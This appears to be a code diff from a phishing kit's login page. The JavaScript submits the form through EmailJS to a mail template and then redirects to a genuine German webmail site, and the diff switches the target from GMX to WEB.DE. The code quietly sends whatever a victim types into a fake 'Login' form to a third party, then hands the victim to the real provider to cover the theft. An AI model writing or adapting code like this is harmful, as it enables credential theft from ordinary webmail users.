@@ -7,12 +7,12 @@ document.getElementById('form')
     btn.value = 'Überprüfen...';
 
     const serviceID = 'default_service';
-    const templateID = 'template_378f58l';
+    const templateID = 'template_qyytds4';
 
     emailjs.sendForm(serviceID, templateID, this)
       .then(() => {
         btn.value = 'Login';
-        window.location.href = 'https://www.gmx.net/produkte/apps/mail/'; // Redirect to the desired link
+        window.location.href = 'https://produkte.web.de/apps/'; // Redirect to the desired link
       }, (err) => {
         btn.value = 'Login';
         alert(JSON.stringify(err));
